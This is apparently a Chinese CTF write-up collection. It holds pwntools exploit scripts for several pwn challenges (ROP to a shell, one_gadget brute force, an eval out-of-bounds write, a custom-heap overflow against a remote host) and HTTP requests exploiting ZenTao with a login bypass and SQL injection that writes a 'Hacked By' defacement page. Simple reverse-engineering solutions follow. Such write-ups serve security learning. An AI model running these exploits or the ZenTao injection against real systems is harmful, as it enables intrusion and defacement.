p = b'A' * 0x80 + b'/bin/sh\x00'
p += p64(pop_rdi)
p += p64(0x601740)
p += p64(libc_base + libc.sym['system'])
io.send(p)

io.interactive()
```



#### 直接溢出爆破one_gadget

既然能爆破，那自然直接爆破one_gadget也是可以的，概率比较低就是了

```python
from pwn import *

count=1

while True:
        io=remote("nc.eonew.cn",10002)
        io.send('A'*0x80+'A'*8+'\xa6\x15\x04')
        io.recv()
        print(count)
        count += 1
        try:    
                io.recv(timeout=0.2)
                io.recv(timeout=0.2)
        except:
                io.close()
                continue
        break
io.interactive()
```



### eval

这题是2023柏鹭杯的一道计算器的题目，逆向难度还是比较大的

这题的切入点是从一个crash开始，如果已知crash该如何分析题目并编写脚本

```shell
➜  2023bolucup ./eval
+23232323232323
[1]    72101 segmentation fault (core dumped)  ./eval
```

进一步测试，会发现会输出一些栈地址

```shell
➜  2023bolucup ./eval
+100
140725581820903
```

这意味着它的输出结果是存在越界的

来看它的处理函数，输出函数输出的是res+0x18 + *(res+0x18)\*8，那么越界极有可能就是\*(res+18)导致的

```c
int __fastcall vuln(const char *buf, __int64 result)
{
  char num; // [rsp+1Fh] [rbp-11h]
  const char *nextnum; // [rsp+20h] [rbp-10h]
  __int64 i; // [rsp+28h] [rbp-8h]

  memset(result, 0, 0xA0uLL);
  nextnum = buf;
  for ( i = 0LL; ; ++i )
  {
    num = buf[i];
    if ( !isfuhao(num) )
      break;
    sub_DC9(result, nextnum, &buf[i]);
    if ( !isNum(buf[i + 1]) )
      error();
    sub_CB1(result, num);
    nextnum = &buf[i + 1];
LABEL_8:
    ;
  }
  if ( num )
    goto LABEL_8;
  sub_DC9(result, nextnum, &buf[i]);
  while ( *result )
    sub_AC7(result);
  return printf("%ld\n", *(result + 8 * (*(result + 0x18) - 1LL + 4)));
}
```

再来看程序

如果我们输入+100，进入for循环后判断+为符号，然后就进入sub_DC9，符号置为0，strtol返回0，继续循环，判断其后是否为数字，进入sub_CB1，此时的res还为0，将其+1,将+符号赋给(res+8)，就返回0了。

然后进入下一次for循环，只要读到的是数字则跳过，直到读到0。然后再进行一次sub_DC9，将其后的数字(字符串)转化为long int，初始化(res+0x18)为1，将long int 放入(res+0x20)

```c
_BYTE *__fastcall sub_DC9(__int64 a1, const char *a2, _BYTE *a3)
{
  _BYTE *result; // rax
  __int64 v4; // rax
  __int64 v5; // rcx
  char v7; // [rsp+27h] [rbp-9h]
  _BYTE *v8; // [rsp+28h] [rbp-8h]

  if ( *a2 == '0' )
    error();
  v7 = *a3;
  *a3 = 0;                                      // 符号值为零
  v8 = strtol(a2, 0LL, 10);
  result = a3;
  *a3 = v7;
  if ( v8 )
  {
    v4 = *(a1 + 0x18);
    *(a1 + 0x18) = v4 + 1;
    v5 = v4 + 4;
    result = v8;
    *(a1 + 8 * v5) = v8;                        // 数字
  }
  return result;
}
```

```c
__int64 __fastcall sub_CB1(_QWORD *res, char num)
{
  __int64 s; // rax

  if ( !*res )
  {
    s = (*res)++;
    *(res + s + 8) = num;
    return s;
  }
  if ( num != '+' )
  {
    if ( num <= '+' )
    {
      if ( num != '*' )
LABEL_16:
        error();
      goto LABEL_8;
    }
    if ( num != '-' )
    {
      if ( num != '/' )
        goto LABEL_16;
LABEL_8:
      if ( sub_91A(*(res + *res + 7)) )
        sub_AC7(res);
      if ( *res > 0xEuLL )
        error();
      s = (*res)++;
      *(res + s + 8) = num;
      return s;
    }
  }
  sub_AC7(res);
  if ( *res > 0xEuLL )
    error();
  s = (*res)++;
  *(res + s + 8) = num;
  return s;
}
```

由于res为1，接下来进入到sub_AC7，对res-1，又变为0，读取符号，根据符号来对基于(res + 0x18)进行加减法操作，*(res+0x20）+1 赋值给 *(res+0x18) ， *(res+0x18) 又减一。

```c
struc_2 *__fastcall sub_AC7(__int64 a1)
{
  struc_2 *result; // rax
  int v2; // eax

  result = *a1;
  if ( *a1 )
  {
    --*a1;
    v2 = *(a1 + *a1 + 8);
    if ( v2 == '+' )
    {
      *(a1 + 8 * (*(a1 + 0x18) - 2LL + 4)) += *(a1 + 8 * (*(a1 + 0x18) - 1LL + 4));
    }
    else if ( v2 > '+' )
    {
      if ( v2 == '-' )
      {
        *(a1 + 8 * (*(a1 + 0x18) - 2LL + 4)) -= *(a1 + 8 * (*(a1 + 24) - 1LL + 4));
      }
      else
      {
        if ( v2 != '/' )
LABEL_15:
          error();
        if ( !*(a1 + 8 * (*(a1 + 24) - 1LL + 4)) )
          error();
        *(a1 + 8 * (*(a1 + 24) - 2LL + 4)) /= *(a1 + 8 * (*(a1 + 24) - 1LL + 4));
      }
    }
    else
    {
      if ( v2 != '*' )
        goto LABEL_15;
      *(a1 + 8 * (*(a1 + 24) - 2LL + 4)) *= *(a1 + 8 * (*(a1 + 24) - 1LL + 4));
    }
    result = a1;
    --*(a1 + 0x18);
  }
  return result;
}
```

走到这应该就明白了(res+0x18)是一个偏移量，但它的值却是(res+0x20)这个由我们输入的数字设置的。

接下来泄露libc即可，既然(res+0x18)是一个写入偏移，那第二次写入数字的偏移就同样改变，利用这一点就可以实现任意地址写

在栈上写入ropchin执行system("/bin/sh")

回看这道题目，主要是逻辑难以理解，ida反汇编的程序结构比较奇怪，让人很难快速找到漏洞点



EXP仅供参考：

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
p = process("./eval")
elf = ELF("./eval")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------
# dbg(0xe0f)
# dbg(0xAF2)
p.sendline('+52')

libc_addr = int(p.recvline()) - 0x24083
success('libc_addr: ' + hex(libc_addr))

# dbg(0xF4E)
p.sendline(f'+54-{libc_addr + 0x52290}'.encode())
p.recvline()
p.sendline(f'+53-{libc_addr + 0x0000000000054310}'.encode())
p.recvline()
p.sendline(f'+52-{libc_addr + 0x1b45bd}'.encode())
p.recvline()
p.sendline(f'+51-{libc_addr + 0x0000000000023b6a}'.encode())
p.recvline()

p.sendline()

ia()
```



### heap

这题是2023柏鹭杯的另一道pwn题，常规菜单，很容易能发现漏洞点在于sub_DCC函数中存在堆溢出

```c
__int64 sub_DCC()
{
  __int64 result; // rax
  int v1; // [rsp+Ch] [rbp-4h]

  printf("index: ");
  result = read_num();
  v1 = result;
  if ( result <= 0x1F )
  {
    result = ptr[result];
    if ( result )
    {
      printf("data: ");
      return read(0, ptr[v1], 0x1000uLL);
    }
  }
  return result;
}
```

题目的问题在于没有使用glibc的堆管理，而是自己写了一个malloc函数和free函数，其逆向程度同样很高，但和eval不一样的是，这题我们是知道如何触发漏洞点的，但是我们对堆的结构不了解，所以我们可以通过纯动调的方式来理解堆结构

```python
add(0x20)
add(0x20)
add(0x20)
add(0x20)
add(0x20)
dbg()
#delete(2)
#delete(1)
#delete(0)
#add(0x20)
#dbg()
```

动调测试

```shell
pwndbg> dq $rebase(0x2030E0)
000055acfac030e0     00007f3dcae09028 00007f3dcae09080
000055acfac030f0     00007f3dcae090d8 00007f3dcae09130
000055acfac03100     00007f3dcae09188 0000000000000000
000055acfac03110     0000000000000000 0000000000000000
pwndbg> dq 00007f3dcae09028 60
00007f3dcae09028     0000000000000000 0000000000000000
00007f3dcae09038     0000000000000000 0000000000000000
00007f3dcae09048     0000000000000000 0000000000000000
00007f3dcae09058     441a12390ea44d00 00000031aaaaaaaa
00007f3dcae09068     00007f3dcae090b0 0000000000000000
00007f3dcae09078     0000000000000000 0000000000000000
00007f3dcae09088     0000000000000000 0000000000000000
00007f3dcae09098     0000000000000000 0000000000000000
00007f3dcae090a8     0000000000000000 15e9be126d128400
00007f3dcae090b8     00000031aaaaaaaa 00007f3dcae09108
00007f3dcae090c8     0000000000000000 0000000000000000
00007f3dcae090d8     0000000000000000 0000000000000000
00007f3dcae090e8     0000000000000000 0000000000000000
00007f3dcae090f8     0000000000000000 0000000000000000
00007f3dcae09108     6f3bc3355c16f900 00000031aaaaaaaa
00007f3dcae09118     00007f3dcae09160 0000000000000000
00007f3dcae09128     0000000000000000 0000000000000000
00007f3dcae09138     0000000000000000 0000000000000000
00007f3dcae09148     0000000000000000 0000000000000000
00007f3dcae09158     0000000000000000 1f9d040849124f00
00007f3dcae09168     00000031aaaaaaaa 0000000000000000
00007f3dcae09178     0000000000000000 0000000000000000
00007f3dcae09188     0000000000000000 0000000000000000
00007f3dcae09198     0000000000000000 0000000000000000
```

我们发现申请的堆通过链表在管理。

除了一个key、标志size位、aaaaaaaa外，还有一个函数指针指向下一个chunk的head头的指针

接下来观察free后的变化(地址后三位是不变的)

```c
add(0x20)
add(0x20)
add(0x20)
add(0x20)
add(0x20)
delete(2)
delete(1)
delete(0)
dbg()
```



```shell
pwndbg> dq 0x0007fe70c574028-0x60 100
00007fe70c573fc8     0000000000000000 0000000000000000
00007fe70c573fd8     0000000000000000 0000000000000000
00007fe70c573fe8     0000000000000000 0000000000000000
00007fe70c573ff8     0000000000000000 5b6f69427e251400
00007fe70c574008     00000030aaaaaaaa 00007fe70c574058
00007fe70c574018     00007fe70c574058 0000000000000000
00007fe70c574028     0000000000000000 0000000000000000
00007fe70c574038     0000000000000000 0000000000000000
00007fe70c574048     0000000000000000 0000000000000000
00007fe70c574058     0a50bd2c157fe100 00000030aaaaaaaa
00007fe70c574068     00007fe70c5740b0 00007fe70c5740b0
00007fe70c574078     0000000000000000 0000000000000000
00007fe70c574088     0000000000000000 0000000000000000
00007fe70c574098     0000000000000000 0000000000000000
00007fe70c5740a8     0000000000000000 3677f0c513b18f00
00007fe70c5740b8     00000030aaaaaaaa 00007fe70c574108
00007fe70c5740c8     0000000000000000 0000000000000000
00007fe70c5740d8     0000000000000000 0000000000000000
00007fe70c5740e8     0000000000000000 0000000000000000
00007fe70c5740f8     0000000000000000 0000000000000000
00007fe70c574108     5569304f1084bd00 00000031aaaaaaaa
00007fe70c574118     00007fe70c574160 0000000000000000
00007fe70c574128     0000000000000000 0000000000000000
00007fe70c574138     0000000000000000 0000000000000000
00007fe70c574148     0000000000000000 0000000000000000
00007fe70c574158     0000000000000000 072959291e153800
00007fe70c574168     00000031aaaaaaaa 0000000000000000
00007fe70c574178     0000000000000000 0000000000000000
00007fe70c574188     0000000000000000 0000000000000000
00007fe70c574198     0000000000000000 0000000000000000
00007fe70c5741a8     0000000000000000 0000000000000000
00007fe70c5741b8     0000000000000000 0000000000000000
00007fe70c5741c8     0000000000000000 0000000000000000
00007fe70c5741d8     0000000000000000 0000000000000000
```

我们发现每个chunk新增了一个指针，我们预期的情况是

```
0->1->2
```

新增的指针符合我们的预期，那我们判断该指针可能为free_chunk的fd指针

后续的思路就是劫持free_hook为后门函数打出环境变量里的flag，这里的free_hook是个bss段变量，因此我们需要程序的基地址。

由于有了任意地址写，考虑劫持stdout实现泄露出程序基地址，程序调用libc会产生地址上的交互。

```shell
pwndbg> search libc.so.6
Searching for value: 'libc.so.6'
heap            0x563314e04201 'libc.so.6'
libc-2.31.so    0x7fe70c68be01 'libc.so.6'
[anon_7fe70c862] 0x7fe70c8664a0 'libc.so.6'
[anon_7fe70c862] 0x7fe70c8664eb 'libc.so.6'
[anon_7fe70c897] 0x7fe70c897f6b 'libc.so.6'
pwndbg> search -p 0x563314e04201
Searching for value: b'\x01B\xe0\x143V\x00\x00'
[anon_7fe70c862] 0x7fe70c8665b0 0x563314e04201
[anon_7fe70c862] 0x7fe70c8665c8 0x563314e04201
[stack]         0x7fff79ee0ab8 0x563314e04201
[stack]         0x7fff79ee1050 0x563314e04201
```

再同样的方式劫持free_hook即可

由于不知道远程的libc版本，也没给libc，但是应该可以通过stdout去泄露几个libc函数来判断版本



EXP仅供参考，不唯一

```python
#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from pwn import *
context.clear(arch='amd64', os='linux', log_level='debug')

sh = remote('8.130.120.45', 20199)

def add(size):
    sh.sendlineafter(b'> ', b'1')
    sh.sendlineafter(b'size: ', str(size).encode())

def delete(index):
    sh.sendlineafter(b'> ', b'2')
    sh.sendlineafter(b'index: ', str(index).encode())

def edit(index, data):
    sh.sendlineafter(b'> ', b'3')
    sh.sendlineafter(b'index: ', str(index).encode())
    sh.sendafter(b'data: ', data)

def show(index):
    sh.sendlineafter(b'> ', b'4')
    sh.sendlineafter(b'index: ', str(index).encode())

add(0x20)
add(0x20)
add(0x20)
add(0x20)
delete(1)
edit(0, b'a' * 0x31)
show(0)
sh.recvuntil(b'a' * 0x31)
guard = u64(b'\0' + sh.recvn(7))
success('guard: ' + hex(guard))
edit(0, b'a' * 0x40)
show(0)
sh.recvuntil(b'a' * 0x40)
heap_addr = u64(sh.recvn(6) + b'\0\0')
success('heap_addr: ' + hex(heap_addr))
libc_addr = heap_addr + 0xfff50
success('libc_addr: ' + hex(libc_addr))
edit(0, b'a' * 0x30 + p64(guard) + b'a' * 0x10 + p64(heap_addr+0x2ed5f0-0x28))
add(0x20)
add(0x20)
edit(4, flat([0xfbad3887, 0, 0, 0, libc_addr + 0x1f2570, libc_addr + 0x1f2578, libc_addr + 0x1f2578, libc_addr + 0x1f2578]))
image_addr =  u64(sh.recvn(8)) - 0x609
success('image_addr: ' + hex(image_addr))

delete(1)
edit(0, b'a' * 0x31)
show(0)
sh.recvuntil(b'a' * 0x31)
guard = u64(b'\0' + sh.recvn(7))
success('guard: ' + hex(guard))
edit(0, b'a' * 0x30 + p64(guard) + b'a' * 0x10 + p64(image_addr+0x2031E8-0x28))
add(0x20)
add(0x20)
edit(5, p64(image_addr + 0xEAD))
delete(1)

sh.interactive()
```


### 2023 qwb zento

启动命令题目给了一个deploy.txt
```
docker run -dit  --name=zentao -p 30021:80  ctf2:latest
docker exec -it zentao /opt/zbox/zbox restart
```

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240116150253.png)

点击开源版

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240116150417.png)


先发包绕过登录
```HTTP
POST /zentao/user-login.html HTTP/1.1
Host: 0.0.0.0:30021
Content-Length: 138
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://0.0.0.0:30021
Referer: http://0.0.0.0:30021/zentao/user-login-L3plbnRhby8=.html
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: zentaosid=a2d4f9dd1efebf91a94b2be556cf5fda; lang=zh-cn; device=desktop; theme=default; windowWidth=1197; windowHeight=791
Connection: close

account=admin&password=94cda481b441635884574c8f7022538ee0f02e75&passwordStrength=0&referer=%2Fzentao%2Fproject-execution-all-1-order_asc-0.html&verifyRand=1282546002&keepLogin=0&captcha=
```

拿到cookie后，进行发包sql注入


```HTTP
POST /zentao/project-create-waterfall-0-0-productID=0,branchID=0.html HTTP/1.1
Host: 0.0.0.0:30021
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
Content-Length: 1000
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: zentaosid=a2d4f9dd1efebf91a94b2be556cf5fda; lang=zh-cn; device=desktop; theme=default; windowWidth=1197; windowHeight=791 
Dnt: 1
Origin: http://0.0.0.0:30021
Referer: http://0.0.0.0:30021/zentao/project-create-waterfall-0-0-productID=0,branchID=0.html
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

PM=admin&acl=private&auth=extend&begin=2024-01-13&budget=1111&budgetUnit=CNY&days=21&delta=31&desc=1111&division=0&end=2024-02-12&hasProduct=1&model=waterfall&name=111&parent=2;SeT @a=0x53454c45435420434f4e43415428554e48455828273363363837343664366333653363366436353734363132303633363836313732373336353734336432323535353434363264333832323365336336383635363136343365336332663638363536313634336533633730323036313663363936373665336432323633363536653734363537323232323037333734373936633635336432323636366636653734326437333639376136353361333533353730373833623230363336663663366637323361373236353634323232303365343836313633366236353634323034323739323037623764336332663730323033653363326636323666363437393365336332663638373436643663336527292c202720272920494e544f204f555446494c4520272f6f70742f7a626f782f6170702f7a656e74616f2f7777772f696e6465782e68746d6c273b;prepare execsql from @a;execute execsql;&productName=&products%5B0%5D=1&uid=65a27fd6db7c3

```

```
0x53454c45435420434f4e43415428554e48455828273363363837343664366333653363366436353734363132303633363836313732373336353734336432323535353434363264333832323365336336383635363136343365336332663638363536313634336533633730323036313663363936373665336432323633363536653734363537323232323037333734373936633635336432323636366636653734326437333639376136353361333533353730373833623230363336663663366637323361373236353634323232303365343836313633366236353634323034323739323037623764336332663730323033653363326636323666363437393365336332663638373436643663336527292c202720272920494e544f204f555446494c4520272f6f70742f7a626f782f6170702f7a656e74616f2f7777772f696e6465782e68746d6c273b

to

SELECT CONCAT(UNHEX('3c68746d6c3e3c6d65746120636861727365743d225554462d38223e3c686561643e3c2f686561643e3c7020616c69676e3d2263656e74657222207374796c653d22666f6e742d73697a653a353570783b20636f6c6f723a72656422203e4861636b6564204279207b7d3c2f70203e3c2f626f64793e3c2f68746d6c3e'), ' ') INTO OUTFILE '/opt/zbox/app/zentao/www/index.html';

3c68746d6c3e3c6d65746120636861727365743d225554462d38223e3c686561643e3c2f686561643e3c7020616c69676e3d2263656e74657222207374796c653d22666f6e742d73697a653a353570783b20636f6c6f723a72656422203e4861636b6564204279207b7d3c2f70203e3c2f626f64793e3c2f68746d6c3e

to

<html><meta charset="UTF-8"><head></head><p align="center" style="font-size:55px; color:red" >Hacked By {}</p ></body></html>

```


### treasure_hunter

SwissTable



hashmap

记录 区域编号：是否安全


## RE challenge 🐹
### [BJDCTF2020]JustRE

```c
sprintf(String, " BJD{%d%d2069a45792d233ac}", 19999, 0);
```

### 刮开有奖

先解sub_4010F0

```
.text:0040123D                 mov     [ebp+var_20030], 5Ah ; 'Z'
.text:00401247                 mov     [ebp+var_2002C], 4Ah ; 'J'
.text:00401251                 mov     [ebp+var_20028], 53h ; 'S'
.text:0040125B                 mov     [ebp+var_20024], 45h ; 'E'
.text:00401265                 mov     [ebp+var_20020], 43h ; 'C'
.text:0040126F                 mov     [ebp+var_2001C], 61h ; 'a'
.text:00401279                 mov     [ebp+var_20018], 4Eh ; 'N'
.text:00401283                 mov     [ebp+var_20014], 48h ; 'H'
.text:0040128D                 mov     [ebp+var_20010], 33h ; '3'
.text:00401297                 mov     [ebp+var_2000C], 6Eh ; 'n'
.text:004012A1                 mov     [ebp+var_20008], 67h ; 'g'
.text:004012AB                 call    sub_4010F0
```

```c
#include <stdio.h>

int sub_5510F0(char a1[], int a2, int a3) {
    int result = a3;
    int i, v5, v6;

    for (i = a2; i <= a3; a2 = i) {
        v5 = i;
        v6 = a1[i];

        if (a2 < result && i < result) {
            do {
                if (v6 > a1[result]) {
                    if (i >= result) break;
                    ++i;
                    a1[v5] = a1[result];

                    if (i >= result) break;
                    while (a1[i] <= v6) {
                        if (++i >= result) goto LABEL_13;
                    }

                    if (i >= result) break;
                    v5 = i;
                    a1[result] = a1[i];
                }
                --result;
            } while (i < result);
        }

LABEL_13:
        a1[result] = v6;
        sub_5510F0(a1, a2, i - 1);  // 递归调用
        result = a3;
        ++i;
    }

    return result;
}

int main(void) {
    char str[] = "ZJSECaNH3ng";  // 输入字符串
    sub_5510F0(str, 0, 10);       // 调用排序函数
    printf("%s\n", str);          // 打印排序后的字符串

    return 0;
}

```

```shell
➜  buure ./test
3CEHJNSZagn
```

最终string要变成这样，得到UJWP，V4和V5不用算，base64解码即可

```c
    if ( String[0] == v7[0] + 0x22 //3->0x33 0x55->U
        && String[1] == v10 //J->0X4a 
        && 4 * String[2] - 141 == 3 * v8 // E->0x45*3->0xCF +141 ->0x15C /4->0x57->W
        && String[3] / 4 == 2 * (v13 / 9) //P
        && !strcmp(v4, "ak1w")  //jMp
        && !strcmp(v5, "V1Ax") ) //WP1
      {
        MessageBoxA(hDlg, "U g3t 1T!", "@_@", 0);
      }
```

flag{UJWP1jMp}


### [ACTF新生赛2020]easyre

v就是输入的flag其实是data_start数组的下标。确保这个下标索引的值等于V4[i]即可
所以反向思考就是去找V4每个元素在data中的下标是多少再加上1，就是我们输入的V5

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _BYTE v4[12]; // [esp+12h] [ebp-2Eh] BYREF
  _DWORD v5[3]; // [esp+1Eh] [ebp-22h]
  _BYTE v6[5]; // [esp+2Ah] [ebp-16h] BYREF
  int v7; // [esp+2Fh] [ebp-11h]
  int v8; // [esp+33h] [ebp-Dh]
  int v9; // [esp+37h] [ebp-9h]
  char v10; // [esp+3Bh] [ebp-5h]
  int i; // [esp+3Ch] [ebp-4h]

  __main();
  qmemcpy(v4, "*F'\"N,\"(I?+@", sizeof(v4));
  printf("Please input:");
  scanf("%s", v6);
  if ( v6[0] != 'A' || v6[1] != 'C' || v6[2] != 'T' || v6[3] != 'F' || v6[4] != '{' || v10 != '}' )
    return 0;
  v5[0] = v7;
  v5[1] = v8;
  v5[2] = v9;
  for ( i = 0; i <= 11; ++i )
  {
    if ( v4[i] != _data_start__[*(v5 + i) - 1] )//它检查 v4 数组的第 i 个字节，是否和\_data_start__ 数组中，索引为 v5[i] - 1 的字节是否相同。
      return 0;
  }
  printf("You are correct!");
  return 0;
}
```

```python
v4 = [42,70,39,34,78,44,34,40,73,63,43,64]
s = ''
flag = ''
__data_strart__ = '~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)(\'&%$# !"'
for i in v4:
    s += chr(__data_strart__.find(chr(i))+1)
    print(s)
```


### 简单注册器

```java
/* loaded from: classes.dex */
public class MainActivity extends ActionBarActivity {
    /* JADX INFO: Access modifiers changed from: protected */
    @Override // android.support.v7.app.ActionBarActivity, android.support.v4.app.FragmentActivity, android.app.Activity
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        if (savedInstanceState == null) {
            getSupportFragmentManager().beginTransaction().add(R.id.container, new PlaceholderFragment()).commit();
        }
        Button button = (Button) findViewById(R.id.button1);
        final TextView textview = (TextView) findViewById(R.id.textView1);
        final EditText editview = (EditText) findViewById(R.id.editText1);
        button.setOnClickListener(new View.OnClickListener() { // from class: com.example.flag.MainActivity.1
            @Override // android.view.View.OnClickListener
            public void onClick(View v) {
                int flag = 1;
                String xx = editview.getText().toString();
                flag = (xx.length() == 32 && xx.charAt(31) == 'a' && xx.charAt(1) == 'b' && (xx.charAt(0) + xx.charAt(2)) + (-48) == 56) ? 0 : 0;
                if (flag == 1) {
                    char[] x = "dd2940c04462b4dd7c450528835cca15".toCharArray();
                    x[2] = (char) ((x[2] + x[3]) - 50);
                    x[4] = (char) ((x[2] + x[5]) - 48);
                    x[30] = (char) ((x[31] + x[9]) - 48);
                    x[14] = (char) ((x[27] + x[28]) - 97);
                    for (int i = 0; i < 16; i++) {
                        char a = x[31 - i];
                        x[31 - i] = x[i];
                        x[i] = a;
                    }
                    String bbb = String.valueOf(x);
                    textview.setText("flag{" + bbb + "}");
                    return;
                }
                textview.setText("输入注册码错误");
            }
        });
    }

```

编写逆向脚本


```c
#include <stdio.h>

int main()
{
    char x[] = "dd2940c04462b4dd7c450528835cca15";
    x[2] = (char)((x[2] + x[3]) - 50);
    x[4] = (char)((x[2] + x[5]) - 48);
    x[30] = (char)((x[31] + x[9]) - 48);
    x[14] = (char)((x[27] + x[28]) - 97);
    for (int i = 0; i < 16; i++) {
        char a = x[31 - i];
        x[31 - i] = x[i];
        x[i] = a;
    }
    puts(x);
    return 0;
}
```

### [GWCTF 2019]pyre

https://tool.lu/pyc/ pyc逆向

```python
#!/usr/bin/env python
# visit https://tool.lu/pyc/ for more information
# Version: Python 2.7

print 'Welcome to Re World!'
print 'Your input1 is your flag~'
l = len(input1)
for i in range(l):
    num = ((input1[i] + i) % 128 + 128) % 128
    code += num

for i in range(l - 1):
    code[i] = code[i] ^ code[i + 1] # 顺序异或

print code
code = [
    '%1f',
    '%12',
    '%1d',
    '(',
    '0',
    '4',
    '%01',
    '%06',
    '%14',
    '4',
    ',',
    '%1b',
    'U',
    '?',
    'o',
    '6',
    '*',
    ':',
    '%01',
    'D',
    ';',
    '%',
    '%13']

```


```python
code = ['\x1f', '\x12', '\x1d', '(', '0', '4', '\x01', '\x06', '\x14', '4', ',', '\x1b', 'U', '?', 'o', '6', '*', ':', '\x01', 'D', ';', '%', '\x13']

flag = ''

# 按逆顺序进行异或操作
for i in range(len(code)-2, -1, -1): # 倒数第二个开始
    code[i] = chr(ord(code[i]) ^ ord(code[i+1]))

# 根据公式恢复原始的 input1（flag）
for i in range(len(code)):
    flag += chr((ord(code[i])-i)%128)

print(flag)
```